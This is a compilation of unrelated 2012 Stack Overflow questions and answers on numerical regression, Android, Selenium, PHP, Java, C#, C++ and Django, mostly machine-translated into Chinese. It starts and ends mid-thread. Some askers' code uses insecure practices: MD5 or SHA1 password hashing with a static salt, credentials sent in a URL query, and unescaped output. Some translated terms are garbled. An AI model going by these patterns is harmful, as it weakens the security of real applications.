   0.016339232547159  -0.000000037654965
  -0.043200042729041  -0.000000051748545
   0.013669010209370  -0.000000037399261
  -0.036586854750176  -0.000000027931617
  -0.004761447097231  -0.000000027168798
   0.017311225027280  -0.000000039099380
   0.005650124339593  -0.000000037005759
   0.016225097484138  -0.000000039060168
  -0.009176443862037  -0.000000012831350
   0.055653840638386  -0.000000020855391
  -0.002834810081935  -0.000000006540702
   0.002794661393905  -0.000000032878097 
```

This would suggest that gradient descent simply did not converge to global minimum... But that is hardly the case as I run it for thousands of iterations. **So where is the bug?**

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-30T15:49:05.700

我终于有时间回到这个话题了。没有“错误”。

如果矩阵是奇异的，则有无穷多个解。您可以从该集合中选择任何解决方案，并获得同样好的答案。pinv(X)*y 解是很多人喜欢的一个很好的解，因为它是最小范数解。

使用 inv(X)*y 从来没有很好的理由。更糟糕的是，在正规方程上使用逆，因此 inv(X'*X)*X'*y 只是数字废话。我不在乎谁告诉你使用它，他们正在引导你到错误的地方。（是的，它对于条件良好的问题可以接受，但大多数时候你不知道它什么时候会给你带来麻烦。那么为什么要使用它呢？）

正规方程通常是一件坏事，即使你正在解决一个正则化问题。有一些方法可以避免对系统的条件数进行平方，尽管除非被问到，否则我不会解释它们，因为这个答案已经足够长了。

X\y 也会产生一个合理的结果。

绝对没有充分的理由在问题上抛出不受约束的优化器，因为这将产生不稳定的结果，完全取决于您的起始值。

作为一个例子，我将从一个单一的问题开始。

```
X = repmat([1 2],5,1);
y = rand(5,1);

>> X\y
Warning: Rank deficient, rank = 1, tol =  2.220446e-15\. 
ans =
                         0
         0.258777984694222

>> pinv(X)*y
ans =
         0.103511193877689
         0.207022387755377 
```

pinv 和反斜杠返回略有不同的解决方案。事实证明，有一个基本的解决方案，我们可以为 X 的行空间添加任意数量的零空间向量。

```
null(X)
ans =
         0.894427190999916
        -0.447213595499958 
```

pinv 生成最小范数解。在所有可能产生的解决方案中，这个具有最小 2 范数。

相反，反斜杠生成的解决方案将一个或多个变量设置为零。

但是，如果您使用不受约束的优化器，它将生成一个完全取决于您的起始值的解决方案。同样，可以将 ANLY 数量的空向量添加到您的解决方案中，并且您仍然有一个完全有效的解决方案，具有相同的误差平方和的值。

请注意，即使没有返回奇异性警告，但这并不意味着您的矩阵不接近奇异性。你对这个问题几乎没有改变，所以它仍然很接近，只是不足以触发警告。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-02T17:15:15.510

正如其他人所提到的，病态的粗麻布矩阵可能是您的问题的原因。

标准梯度下降算法达到局部最优所需的步数是 hessian 的最大特征值除以最小值的函数（这称为 Hessian 的条件数）。因此，如果您的矩阵是病态的，那么梯度下降可能需要大量的迭代才能收敛到最优值。（当然，对于单数情况，它可以收敛到很多点。）

我建议尝试三种不同的方法来验证无约束优化算法是否适用于您的问题（它应该）：1）通过计算随机输入的已知线性函数的结果并添加少量高斯噪声来生成一些合成数据. 确保您拥有比维度更多的数据点。这应该产生一个非奇异的粗麻布。2）在您的误差函数中添加正则化项以增加粗麻布的条件数。3）使用二阶方法，如共轭梯度或 L-BFGS，而不是梯度下降，以减少算法收敛所需的步骤数。（您可能需要与#2 一起执行此操作）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-30T05:46:19.997

你能多发一点关于你 X 的样子吗？您使用的是 Moore-Penrose 伪逆的 pinv()。如果矩阵是病态的，这可能会导致获得逆矩阵的问题。我敢打赌，梯度下降法更接近标记。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-30T05:36:14.357

您应该看到哪种方法实际上给您的错误最小。这将表明哪种方法正在挣扎。我怀疑正规方程法是有问题的解决方案，因为如果 X 是病态的，那么你可能会遇到一些问题。

您可能应该替换`theta = X\y`将使用 QR 分解方法来解决它的正规方程解决方案。

# android - Sending SMS through a webservice in Android

> ID：11271319
> 
> 赞同：0
> 
> 时间：2012-06-30T04:08:35.017
> 
> 标签：android, android-asynctask

I am trying to send SMS using a webservice call. But am having errors in doing so

This is the code snippet of what I am making use of

```
public void sendSMS(String from, String to, String msg) {
        if (stat == -1) {
            sms_url = username + "&password=" + password + "&from=" + from
                    + "&to=" + to + "&message=" + msg + "";
            new SendSMS().execute(sms_url);
        }
    }

private class SendSMS extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... urls) {

            for (String url : urls) {
                HttpClient client = new DefaultHttpClient();
                HttpGet httpGet = new HttpGet(url);
                try {
                    HttpResponse execute = client.execute(httpGet);
                    InputStream content = execute.getEntity().getContent();

                    BufferedReader buffer = new BufferedReader(
                            new InputStreamReader(content));
                    String s = "";
                    while ((s = buffer.readLine()) != null) {
                        result += s;
                    }

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            return result;
        }

        @Override
        protected void onPostExecute(String result) {
            // textView.setText(result);
            Intent intent = new Intent("com.sms.subsahara.CONFIRMACTIVITY");
            startActivity(intent);
        }
    }

    class PostService extends AsyncTask<String, Void, String> {

        @Override
        protected String doInBackground(String... params) {

            Login();
            Log.d(LOGTAG, "Success");

            return "success";
        }

        @Override
        protected void onPostExecute(String r) {
            // TODO Auto-generated method stub
            super.onPostExecute(result);
            String msg = "Login successful";

            if (MenuActivity.status == 2) {
                Log.d(LOGTAG, result);
                Log.d(LOGTAG, error + " " + uid + " " + langId + " " + rank);

            } else if (SendUsing.status == 0) {
                if (result.substring(0, 16).trim().equals(msg)) {
                    Log.d(LOGTAG, " " + "Connection Test" + result);

                    stat = -1;
                    String from = composesms.sender;
                    String to = composesms.phoneNo;
                    String message = composesms.message;
                    sendSMS(from, to, message);
                    Log.d(LOGTAG, result);
                    // new SendSMS().execute(params);

                } else {
                    Toast.makeText(getBaseContext(),
                            "Login UnSuccesful. Check Username or password",
                            Toast.LENGTH_SHORT).show();
                }

            }
        } 
```

And on the submit Button, I have

```
 public void onClick(View v) {

                if (SendUsing.status == 0) {
                        new PostService().execute("success");
                } 
} 
```

The Problem is when I do so, I get the following Exception

```
java.lang.IllegalStateException: Target host must not be null, or set in parameters.
   at org.apache.http.impl.client.DefaultRequestDirector.determineRoute(DefaultRequestDirector.java:561)
   at org.apache.http.impl.client.DefaultRequestDirector.execute(DefaultRequestDirector.java:292)
   at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:555)
 freed 4919 objects / 298512 bytes in 153ms
   at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:487)
   at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:465)
   **at com.sms.subsahara.WebMessengerActivity$SendSMS.doInBackground(WebMessengerActivity.java:272)
   at com.sms.subsahara.WebMessengerActivity$SendSMS.doInBackground(WebMessengerActivity.java:1)** 
```

Please how do I solve this

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T05:25:54.277

```
sms_url = username + "&password=" + password + "&from=" + from
                    + "&to=" + to + "&message=" + msg + ""; 
```

看起来这一行只是制作 url 的参数而不是完整的 url

```
 sms_url = "http://your_serviceurl.com?"+sms_url; 
```

# testing - I have an issue running tests using remote webdriver (grid2) that works on local webdriver

> ID：11271320
> 
> 赞同：0
> 
> 时间：2012-06-30T04:09:08.153
> 
> 标签：testing, selenium, webdriver

I have a little issue with some Webdriver tests in order to make them run using grid2.

My first issue is, that some tests need to check something on another domain, for example, I start on domain AA and then check a result on domain BB. Going to domain BB when I run local is not a problem, but using grid (Launching from a hub and testing on clients) the tests stop in that step.

The other problem, is that many findby functions only works locally, but using remote webdriver they return a null pointer exception (By xpath for example). Why is webdriver finding elements when test are local and not when tests run on remote pcs?

As a clarification, in both PCs (Hub and node) test run perfectly when I run them local, but also, in both, they fail using remote webdriver.

Any clues about his?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T16:52:23.933

浏览器、版本、设置、操作系统等可能有多种原因。您在说什么浏览器？你的硒版本是什么？这个问题在所有浏览器上都存在吗？您的域是否使用安全协议 HTTPS？定义远程 webdriver 的几行代码也会有所帮助。否则给出答案将是在黑暗中射击。您是否尝试过所需的功能？像下面这样的东西？

```
DesiredCapabilities capabilities =  DesiredCapabilities.firefox();
capabilities.setJavascriptEnabled(true);
capabilities.setCapability(CapabilityType.ACCEPT_SSL_CERTS, true);      
capabilities.setCapability(CapabilityType.HAS_NATIVE_EVENTS, true);
capabilities.setCapability(CapabilityType.TAKES_SCREENSHOT, true);
driver = new RemoteWebDriver(new URL("....."), capabilities); 
```

也许这会引导您找到解决方案。如果您使用的是 IE，请确保您正在测试的域存在于受信任的站点设置中。

# php - Ideal way to encrypt user passwords

> ID：11271321
> 
> 赞同：1
> 
> 时间：2012-06-30T04:09:20.457
> 
> 标签：php

I initially used MD5 when i first started out coding to hash user passwords.

```
 $password1 = md5($password); 
```

After reading countless of pages with different opinions, what shall i be using? `crypt`,`SHA1`,`SHA256`... here is an example of how i revised code by using SHA1 and static salting.

```
$salt = '324912343223942833294328432392';
$passwordarray = str_split($password,2);
$password1 = sha1($passwordarray[0].$salt.$passwordarray[1]);
//insert $password1 into database 
```

when logging in and checking password..

```
$salt = '324912343223942833294328432392';

    $passwordarray = str_split($password,2);
    $dbpasswordarray = str_split($dbpasswordarray,2);

    $password = sha1($passwordarray[0].$salt.$passwordarray[1]);
    $dbpassword = sha1($dbpasswordarray[0].$salt.$dbpasswordarray[1]);

               if ($username==$dbusername&&md5($password3)==$dbpassword)
               { 
```

What shall i do to improve/change this code and make it more secure? .. can i have an example.. Shall i do dynamic salting and add a unique salt to each user in the database?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T04:11:26.547

You should [use bcrypt](http://codahale.com/how-to-safely-store-a-password/).

The problem with MD5, SHA-1, etc is that they were designed to be *fast to compute*. This makes brute force and dictionary attacks easy because you can test millions of passwords per second.

Bcrypt solves this by being deliberately slow. It has a work factor that can be adjusted so that as hardware improves you can make the calculation more difficult.

**Related**

*   [How do you use bcrypt for hashing passwords in PHP?](https://stackoverflow.com/questions/4795385/how-do-you-use-bcrypt-for-hashing-passwords-in-php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T04:12:26.053

It's partly a matter of how much effort you want to put into securing your logins. In the last couple years I've been moving toward dynamic salting / each user having their own salt value. This keeps hackers from using rainbow tables if they get ahold of your database. I also use sha256 hashing.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T04:13:24.233

Maybe you could follow the example of existing libraries or frameworks.

For example, the Django Framework explains:

> How Django stores passwords
> 
> The password attribute of a User object is a string in this format:
> 
> algorithm$hash
> 
> That's a storage algorithm, and hash, separated by the dollar-sign character. The algorithm is one of a number of one way hashing or password storage algorithms Django can use; see below. The hash is the result of the one- way function.
> 
> By default, Django uses the PBKDF2 algorithm with a SHA256 hash, a password stretching mechanism recommended by NIST. This should be sufficient for most users: it's quite secure, requiring massive amounts of computing time to break.

They also provide a helpful link on recommended practices when storing password: [http://csrc.nist.gov/publications/nistpubs/800-132/nist-sp800-132.pdf](http://csrc.nist.gov/publications/nistpubs/800-132/nist-sp800-132.pdf)

**Source**: [https://docs.djangoproject.com/en/dev/topics/auth/](https://docs.djangoproject.com/en/dev/topics/auth/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-30T06:10:10.657

我会研究一个库来处理密码散列/加盐/检查等。一个简单容易实现的是[便携式 PHP 密码散列框架](http://www.openwall.com/phpass/)。这与 wordpress 和许多其他 php 应用程序使用的库相同。它会自动检查可用的最安全的 php 哈希算法。由于 php 发行版支持不同的算法。通过这种方式，您可以在不牺牲便携性的情况下获得最大可能的安全性。

我真的很喜欢它，因为它让我省去了很多头痛。在安全加密方面，我宁愿依靠比我更聪明的人。

# php - 站点地图文件可以是 php 吗？

> ID：11271328
> 
> 赞同：2
> 
> 时间：2012-06-30T04:10:07.937
> 
> 标签：php, xml, seo

我对搜索引擎优化还很陌生。但是，我听说站点地图可以极大地改善 SEO。我知道站点地图文件必须是 xml 格式。但是，我的网站内容非常动态。话虽如此，我需要查询数据库以了解内容随着时间的推移发生了怎样的变化。我的代码如下：

```
<?php
require_once("functions.php");
connect();

//  Query the DB to get the past season MLB teams   
$query  =   mysql_query("SELECT * FROM past_season_team_articles") or die(mysql_error());
$count  =   mysql_num_rows($query);
$i      =   0;

while($row = mysql_fetch_assoc($query)) 
{
    $team[$i]   =   $row['team'];
    $year[$i]   =   $row['year'];   

    $i++;
}
?>
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
<?php
 // Loop thru the array and echo out the MLB teams
for($i=0;$i<$count;$i++)
{
?>
<url>
    <loc>http://www.sportannica.com/teams.php?team=<?php echo $team[$i]; ?>&amp;year=<?    php echo $year[$i]; ?></loc>
    <changefreq>weekly</changefreq>
    <priority>0.8</priority>
</url>
<?php
}
?>
</urlset> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T04:20:51.750

我使用 .htaccess（在 Apache 下和使用 helicon 的 IIS 下）将对 sitemap.xml 的请求映射到返回“实时”站点地图的 sitemap.php。刚刚快速查看了您的代码，但看起来正确，您只需要映射重写。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T04:17:18.477

如果您使用的是 Apache 或 NginX，则可以使用重写规则将站点地图文件的请求处理为生成站点地图内容的 PHP 脚本，以及相应的标头。

如果您提供有关您的设置的更多详细信息，可能会很好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T04:36:16.733

你试试这个..

```
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
<?php

while($row = mysql_fetch_assoc($query)) 
{
    echo "<url><loc>http://www.sportannica.com/teams.php?team=$row['team']&amp;year=$row['year']</loc>";
    echo " <changefreq>weekly</changefreq>
    <priority>0.8</priority>
</url>";
}
?>
</urlset> 
```

# java - 将图像转换为 BufferedImage

> ID：11271329
> 
> 赞同：2
> 
> 时间：2012-06-30T04:10:10.760
> 
> 标签：java, bufferedimage

我在磁盘上有一个图像。我想将它转换为 BufferedImage 以便我可以在其上应用过滤器。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-30T04:18:06.183

使用[ImageIO.read(File)](http://docs.oracle.com/javase/6/docs/api/javax/imageio/ImageIO.html#read%28java.io.File%29)。它返回 BufferedImage ：

```
BufferedImage image = ImageIO.read(new File(filename)); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-30T04:15:18.957

试试这个，使用类“javax.imageio.ImageIO”像

```
BufferedImage originalImage = ImageIO.read(new File("c:\\image\\mypic.jpg")); 
```

另请参阅此链接

[http://www.dzone.com/snippets/converting-images](http://www.dzone.com/snippets/converting-images)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-30T04:23:14.140

将常规转换为 a 的最安全方法`Image`是`BufferedImage`创建一个新`BufferedImage`的并在其上绘制`Image`，如下所示：

```
Image original = ...;

BufferedImage b_img = new BufferedImage(original.getWith(), original.getHeight(), BufferedImage.TYPE_4BYTE_ARGB);
// or use any other fitting type

b_img.getGraphics().drawImage(original, 0, 0, null); 
```

这可能不是关于性能的最佳方式，但它肯定总是有效的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-30T04:24:17.677

Java 2D™ 支持使用包中的其将这些外部图像格式加载到其**BufferedImage**格式中。图像 I/O 具有对 GIF、PNG、JPEG、BMP 和 WBMP 的内置支持。`Image I/O API``javax.imageio`

要从特定文件加载图像，请使用以下代码：

```
BufferedImage img = null;
try {
    img = ImageIO.read(new File("image.jpg"));
} catch (IOException e) {
   e.printStackTrace()
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-30T05:16:38.540

要从特定文件加载图像，请使用以下代码：
阅读更多[阅读/加载图像](http://docs.oracle.com/javase/tutorial/2d/images/loadimage.html)。
[使用图像](http://docs.oracle.com/javase/tutorial/2d/images/index.html)

```
BufferedImage img = null;
 try {
   img = ImageIO.read(new File("your/image/path/name.jpg"));
  } catch (IOException e) { 
   // handle exception 
  } 
```

# php - 正则表达式需要更改 URL

> ID：11271339
> 
> 赞同：0
> 
> 时间：2012-06-30T04:12:23.037
> 
> 标签：php, regex, preg-replace

我想将这些 URL 转换为 SEO 友好的 URL：

```
index.php?t=1&s=1&offset=50&hits=50   --->  index-t-1-s-1-offset-50-hits-50.html
index.php?t=1&s=1                     --->  index-t-1-s-1.html
index.php?t=1&s=&offset=50&hits=50    --->  index-t-1-s-1-offset-50-hits-50.html
index.php?t=1                         --->  index-t-1.html 
```

我写了这个：

```
$filename = substr(basename($base_href),0,'-4');
$str = preg_replace('/href=\'\?t=(\d+)&s=(\d+)\'/i', 'href=\''.$filename.'-t-$1-s-$2.html\'', $str); 
```

但我需要一个通用的表达方式。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T04:27:42.107

我注意到您将`.php?`（`?`我认为这是可选的）术语和所有符号替换为`-`，最后附加`.html`。所以，你只需要这样做：

```
$filename = "index.php?t=1&s=1&offset=50&hits=50";
$result = preg_replace('/(?:\.php\??|\W)/', '-', $filename) . '.html';
//~> index-t-1-s-1-offset-50-hits-50.html 
```

它会做：

*   替换`.php?`或; `.php`_`-`
*   将非字母`\W`（不与 混淆`\w`）替换为`-`;
*   附加`.html`在结果上

[在此处](http://www.regular-expressions.info/reference.html/)阅读有关正则表达式的更多信息

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T04:25:10.407

对于解决方案，我首先将 URL 拆分为`?`，然后将所有`&`和`=`替换为 ，然后`-`将字符串连接回来（在处理后删除`.php`URL 的另一部分）

# apache - URL 重写 - 查询字符串

> ID：11271352
> 
> 赞同：0
> 
> 时间：2012-06-30T04:15:57.607
> 
> 标签：apache, .htaccess, mod-rewrite, query-string

我在 MVC 应用程序上工作，我有以下格式的 url：

```
http://127.0.0.1/PDO/PARTIE%20III/index.php?rt=index/connexion
http://127.0.0.1/PDO/PARTIE%20III/index.php?rt=index/nouveauMsg 
```

我正在寻求重写 url，使其显示为：

```
http://127.0.0.1/PDO/PARTIE%20III/index/connexion
http://127.0.0.1/PDO/PARTIE%20III/index/nouveauMsg 
```

有没有人有任何建议可以帮助我完成这个 url_rewrite？

那是解析 URL 并加载正确视图和/或操作的路由器类

```
<?php

class router {
 /*
 * @the registry
 */
 private $registry;

 /*
 * @the controller path
 */
 private $path;

 private $args = array();

 public $file;

 public $controller;

 public $action; 

 function __construct($registry) {
    $this->registry = $registry;
 }

 /**
 *
 * @set controller directory path
 *
 * @param string $path
 *
 * @return void
 *
 */
 function setPath($path) {

/*** check if path i sa directory ***/
if (is_dir($path) == false)
{
    throw new Exception ('Invalid controller path: `' . $path . '`');
}
/*** set the path ***/
$this->path = $path;
}

 /**
 *
 * @load the controller
 *
 * @access public
 *
 * @return void
 *
 */
 public function loader()
 {
/*** check the route ***/
$this->getController();

/*** if the file is not there diaf ***/
if (is_readable($this->file) == false)
{
    $this->file = $this->path.'/error404.php';
            $this->controller = 'error404';
}

/*** include the controller ***/
include $this->file;

/*** a new controller class instance ***/
$class = $this->controller . 'Controller';
$controller = new $class($this->registry);

/*** check if the action is callable ***/
if (is_callable(array($controller, $this->action)) == false)
{
    $action = 'index';
}
else
{
    $action = $this->action;
}
/*** run the action ***/
$controller->$action();
 }

 /**
 *
 * @get the controller
 *
 * @access private
 *
 * @return void
 *
*/
private function getController() {

/*** get the route from the url ***/
$route = (empty($_GET['rt'])) ? '' : $_GET['rt'];

if (empty($route))
{
    $route = 'index';
}
else
{
    /*** get the parts of the route ***/
    $parts = explode('/', $route);
    $this->controller = $parts[0];
    if(isset( $parts[1]))
    {
        $this->action = $parts[1];
    }
}

if (empty($this->controller))
{
    $this->controller = 'index';
}

/*** Get action ***/
if (empty($this->action))
{
    $this->action = 'index';
}

/*** set the file path ***/
$this->file = $this->path .'/'. $this->controller . 'Controller.php';
}

} 
```

?>

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T04:37:12.947

`.htaccess`在文档根目录或 Apache 配置文件中使用此重写规则：

```
RewriteEngine On
RewriteRule ^PDO/PARTIE%20III/(.*)$ PDO/PARTIE%20III/index.php?rt=$1 [L] 
```

[您可以在Martin Melin 的网站上](http://martinmelin.se/rewrite-rule-tester/)轻松测试重写规则。

更多信息：[Apache 的`mod_rewrite`模块](http://httpd.apache.org/docs/2.4/en/mod/mod_rewrite.html)。

# html - Facebook Like Box 未显示

> ID：11271354
> 
> 赞同：0
> 
> 时间：2012-06-30T04:16:31.530
> 
> 标签：html, facebook, facebook-likebox

我在编程课上为我的项目创建了一个网站（它没有发布，它在我的电脑中使用 url）

我在让 Facebook 点赞框出现在我的网页中时遇到问题

这是我的页面外观的屏幕截图（我已连接到互联网并且当前已登录我的 facebook 帐户）

我使用了 iframe 版本的代码

[http://i784.photobucket.com/albums/yy129/jian_lastino2000/qwert.jpg](http://i784.photobucket.com/albums/yy129/jian_lastino2000/qwert.jpg)（对不起，我赶时间……系统说我需要 10 声望才能发布图片 xD）

```
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html>
<head>
    <meta http-equiv="Content-type" content="text/html; charset=UTF-8" />
    <link rel="shortcut icon" href="images/general/favicon.png" width="32px" height="32px" type="image/x-icon">
    <title>RCICT 2012</title>
    <meta http-equiv="Content-Language" content="en-us" />
    <meta http-equiv="imagetoolbar" content="yes" />
    <meta name="MSSmartTagsPreventParsing" content="true" />
    <meta name="Project1" content="project 1 for lbyec71" />
    <meta name="keywords" content="programming html" />
    <meta name="Jian Lastino" content="RCICT 2012" />
    <style type="text/css" media="all">@import "css/master.css";</style>  
    <script type="text/javascript" src="jquery.js">function nav(){
$('div#nav ul li').mouseover(function() {
$(this).find('ul:first').show();
});

$('div#nav ul li').mouseleave(function() {
$('div#nav ul li ul').hide();
});

$('div#nav ul li ul').mouseleave(function() {
$('div#nav ul li ul').hide();;
});
};

$(document).ready(function() {
nav();
});</script>
<div class="fb-like" data-send="true" data-width="450" data-show-faces="true"></div>
</head>
<body class="about">
<div id="page-container">
<div id="menu">

        <table border="0" style="border-spacing: 85px 0px;"> 
<tr>
<td> 
<a href="mypage.html"  "text-decoration:none" ;>
Home</a>
</td>
<td> 
<a href="committees.html"  >
Committees</a>
</td> 
<td> 
<a href="tracks.html">Conference Tracks</a> 
</td> 
<td> 
<a href="dates.html">Important Dates</a>
</td> 
<td> 
<a href="submission.html">
Abstract Submission Procedure</a>
</td> 
</tr>
</table>
</div></br></br>

    <div id="header">
    <object width="900" height="150"
classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"
codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0">
<param name="SRC" value="header.swf">
<embed src="header.swf" width="900" height="150"></embed>
</object>
</div>
    <div id="sidebar-a">
    <div class="padding">
    <iframe src="//www.facebook.com/plugins/likebox.php?href=https%3A%2F%2Fwww.facebook.com%2Frcict2012&amp;width=292&amp;height=290&amp;colorscheme=light&amp;show_faces=true&amp;border_color&amp;stream=false&amp;header=true&amp;appId=165351403548315" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:292px; height:290px;" allowTransparency="true"></iframe>
    </div>
</div>

    <div id="content" >
    <div class="padding">
    <h2><img src="images/headings/about.png" alt="About" /></h2></br>

    <p><strong>The 5th Regional Conference on Information and Communication Technology  (RCICT 2012) is the fifth AUN/SEED-Net Regional Conference in ICT fields that will be held on October 18-19, 2012 in Traders Hotel,Manila,Philippines. The RCICT is a discussion of ideas, techniques, and innovations in the field of advanced computing among scientists, engineers, and practitioners. We encourage the submission of works in progress. We will provide a friendly environment where researchers can discuss current and future trends in their research areas.</strong></p>
    <strong><p>In addition, the 1st National Conference of Computer Engineers of the Philippines will be also held in conjunction with the said event.</p></strong>

    <h2><img src="images/headings/contactperson.png" alt="Contact Person" /></h2>
    <h3>Engr. Cesar A. Llorente</h3>
    <p>
CPE/ECE Department, De La Salle University-Manila, Philippines.</br>
Phone: +632 524-4611 Local 224</br>
<a href="mailto:cesar.llorente@dlsu.edu.phSubject=Hello%20again">Send E-mail</a></br>
</p>
    </div>
    </div>
</div>
    <div id="footer">
    <div id="altnav">

        <a href="https://www.facebook.com/rcict2012" target="_blank";><img src="images/footer/facebook.png" alt="Facebook" /></a><a href="https://twitter.com/#!/rcict2012" target="_blank";><img src="images/footer/twitter.png" alt="Facebook" /></a> 
        <a href="#">Portfolio</a> - 
        <a href="#">Contact Us</a>

    </div>
    <div id="copyright">
    |<a href="mypage.html">Home</a>|<a href="committees.html">Committees</a>|<a href="tracks.htnk">Conference Tracks</a>        |<a href="dates.html">Important Dates</a>|<a href="submit.html">Abstract Submission Procedure</a>|</br>
    Potato &copy;<br />
    Designed By <a href="http:/facebook.com/jlastino" target="_blank">Jian Lastino</a> and <a href="https://www.facebook.com/dampoy.orsolino" target="_blank"> Dampoy Orsolino</a>

    </div>
    </div>
</body> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T04:54:56.010

通过使用 iFrame 是正确的。我认为您的代码也是正确的。但是你必须使用本地服务器作为 LAMP 或 Xamp。它会运行...

# c# - 从 Web 应用程序 c# 调用 (.exe) 控制台应用程序时，命令提示符不会打开

> ID：11271356
> 
> 赞同：0
> 
> 时间：2012-06-30T04:16:55.857
> 
> 标签：c#, console, cmd

我正在使用我的网络应用程序中的这个函数来调用 exe 文件。当它调用 .exe 文件时，每件事都会准确地发生，我可以将其视为任务管理器进程中的正在运行的进程，但是为什么在调用此进程时不打开命令提示符。

Web 应用程序托管在同一系统的 iis 上。

```
 public void RunconsoleApplication(string Id)
    {
        // Get the file path of your Application (exe)
        string filePath = @"E:/ConsoleApplication1/ConsoleApplication1/bin/Debug/ConsoleApplication1.exe";

        System.Diagnostics.ProcessStartInfo info = new System.Diagnostics.ProcessStartInfo(filePath, Id);

        System.Diagnostics.Process p = System.Diagnostics.Process.Start(info);//called       

    } 
```

**更新**

在visual atudio上运行相同的应用程序时，会打开命令提示符。但在 iis 上托管时不会

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T04:36:40.180

IIS 及其子进程在不同的（和无窗口的）会话中运行。所以你看不到窗口是否打开。此外，某些进程可能会因此而表现异常（您可能没有遇到此类问题，并且不太可能遇到控制台应用程序问题）。

您可以通过在任务管理器中打开“会话 ID”列来查看它：查看 -> 选择列-> 会话 ID（在进程选项卡上）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T04:31:04.260

您是否尝试将窗口样式设置为最大化？

```
ProcessStartInfo startInfo = new ProcessStartInfo("IExplore.exe");
startInfo.WindowStyle = ProcessWindowStyle.Maximized;
Process.Start(startInfo); 
```

# c++ - 如何从 C++ 中的命令行中删除打印的字符

> ID：11271362
> 
> 赞同：7
> 
> 时间：2012-06-30T04:18:17.993
> 
> 标签：c++, command-line

前几天我在windows 2000上下载了一个编译器（我认为是MinGW，但我不确定）（我通常是Mac用户，但它不是我的机器），下载器是MS-DOS将显示下载进度条的命令行应用程序。像这样的东西...

```
|---                 | 15%
...
|------              | 30%
...
...
|--------------      | 70% 
```

除了它会在同一行上不断更新。我假设程序通过删除以前打印的字符并重新打印不同的字符来实现这一点，但我似乎无法弄清楚如何做到这一点。

我尝试过几种不同的方式打印一个“删除”字符，比如`(char)8`和`\b`（甚至`\r`，我在某些语言中听到回溯到行首），但这些方法都不起作用。

有谁知道如何做这种事情？

编辑：这个问题已成为特定于平台的问题。我想具体了解如何在 Mac 上完成此操作。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-30T04:32:49.983

我不确定你为什么会遇到问题，但要么`\b or \r`可以用来做到这一点，我用过`\b`.

```
#include <iostream>
#include <iomanip>
#include <string>
#include <windows.h>

// This is the only non-portable part of this code.
// Simply pause for a specified number of milliseconds
// For Windows, we just call Sleep. For Linux, you'd
// probably call nanosleep instead (with a suitable
// multiplier, of course). Most other systems (presumably)
// have (at least vaguely) similar capabilities.
void pause(int ms) { 
    Sleep(ms);
}

static const int width = 40;    

void show_percent(int i) {
     int dashes = (width * i)/100;

     std::cout << '|' << std::left << std::setw(width) << std::string(dashes, '-') << '|' << std::setw(3) << i << "%";
}

int main() {

    for (int i=0; i<101; i++) {
        show_percent(i);
        std::cout << std::string(width+6, '\b');
        pause(100);
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-30T04:27:19.127

根据[维基百科](http://en.wikipedia.org/wiki/ANSI_escape_code#Windows_and_DOS)：

> Win32 控制台根本不支持 ANSI 转义序列。软件可以使用与文本输出交错的类似 ioctl 的控制台 API 来操作控制台。一些软件在内部解释正在打印的文本中的 ANSI 转义序列，并将它们转换为这些调用 [需要引用]。

看看这个：http: [//msdn.microsoft.com/en-us/library/ms682073.aspx](http://msdn.microsoft.com/en-us/library/ms682073.aspx)

我相信`SetConsoleCursorPosition`这是允许您替换文本的原因。

# python - 即使我检查现有记录，Django IntegrityError

> ID：11271363
> 
> 赞同：0
> 
> 时间：2012-06-30T04:18:37.087
> 
> 标签：python, database, django

我将 uuid 设置为在模型中是唯一的，并且以下代码应该防止任何重复问题，但如果 uuid 已经存在，它会生成一个 IntegrityError。

即使存在具有请求的 uuid 的视频对象，get 似乎也会返回 false。知道为什么会发生这种情况吗？

```
try:
    v = Video.objects.get(uuid = video_id)
except Video.DoesNotExist:
    v = Video(uuid = video_id)
    v.save() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T04:53:51.323

